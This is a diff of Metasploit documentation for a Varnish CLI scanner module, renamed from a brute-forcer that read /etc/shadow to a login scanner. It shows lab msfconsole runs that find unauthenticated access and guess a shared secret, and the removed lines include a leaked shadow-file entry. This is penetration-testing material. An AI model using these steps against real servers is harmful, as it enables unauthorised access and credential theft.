@@ -1,16 +1,17 @@
 ## Vulnerable Application
 
   Ubuntu 14.04 can `apt-get install varnish`.  At the time of writing that installed varnish-3.0.5 revision 1a89b1f.
+  Kali installed varnish-5.0.0 revision 99d036f
   
   Varnish installed and ran the cli on localhost.  First lets kill the service: `sudo service varnish stop`.  Now, there are two configurations we want to test:
-  
-  
-  1. `varnishd -T 0.0.0.0:6082` no authentication
-  2. `varnishd -T 0.0.0.0:6082 -S <file>` authentication based on shared secret file.  I made an easy test one `echo "secret" > secret`
+
+  1. No Authentication: `varnishd -T 0.0.0.0:6082`
+  2. Authentication (based on shared secret file): `varnishd -T 0.0.0.0:6082 -S <file>`.
+    1. I made an easy test one `echo "secret" > ~/secret`
 
 ## Exploitation Notes
 
-These notes were taken from the module, and can be used when developing a working remote exploit
+These notes were taken from the original module in EDB, and can be used when developing a working remote exploit
 
 ```
 - varnishd typically runs as root, forked as unpriv.
@@ -83,29 +84,51 @@ enum cli_status_e {
 
   1. Install the application
   2. Start msfconsole
-  3. Do: ```use auxiliary/scanner/varnish/varnish_cli_bruteforce```
+  3. Do: ```use auxiliary/scanner/varnish/varnish_cli_login```
   4. Do: ```run```
-  5. You should get to read the first line of the /etc/shadow file.
+  5. Find a valid login.
 
 ## Options
 
-  **FILE**
+  **PASS_FILE**
 
-  Which file to read the first line from.  The default is /etc/shadow.
+  File which contains the password list to use.
 
 ## Scenarios
 
   Running against Ubuntu 14.04 with varnish-3.0.5 revision 1a89b1f and NO AUTHENTICATION
 
   ```
-    msf auxiliary(varnish_cli_bruteforce) > use auxiliary/scanner/varnish/varnish_cli_bruteforce
-    msf auxiliary(varnish_cli_bruteforce) > set verbose true
+    resource (varnish.rc)> use auxiliary/scanner/varnish/varnish_cli_login
+    resource (varnish.rc)> set pass_file /root/varnish.list
+    pass_file => /root/varnish.list
+    resource (varnish.rc)> set rhosts 192.168.2.85
+    rhosts => 192.168.2.85
+    resource (varnish.rc)> set verbose true
     verbose => true
-    msf auxiliary(varnish_cli_bruteforce) > run
-    
-    [+] 192.168.2.85:6082     - Varnishd CLI does not require authentication!
-    [+] 192.168.2.85:6082     - First line of /etc/shadow: root:!:17123:0:99999:7::::
+    resource (varnish.rc)> run
+    [+] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN SUCCESSFUL: No Authentication Required
     [*] Scanned 1 of 1 hosts (100% complete)
     [*] Auxiliary module execution completed
+    msf auxiliary(varnish_cli_login) > 
+    ```
 
+  Running against Ubuntu 14.04 with varnish-3.0.5 revision 1a89b1f
+
+  ```
+    resource (varnish.rc)> use auxiliary/scanner/varnish/varnish_cli_login
+    resource (varnish.rc)> set pass_file /root/varnish.list
+    pass_file => /root/varnish.list
+    resource (varnish.rc)> set rhosts 192.168.2.85
+    rhosts => 192.168.2.85
+    resource (varnish.rc)> set verbose true
+    verbose => true
+    resource (varnish.rc)> run
+    [*] 192.168.2.85:6082     - 192.168.2.85:6082 - Authentication Required
+    [!] 192.168.2.85:6082     - No active DB -- Credential data will not be saved!
+    [*] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN FAILED: bad
+    [*] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN FAILED: good
+    [+] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN SUCCESSFUL: secret
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
   ```
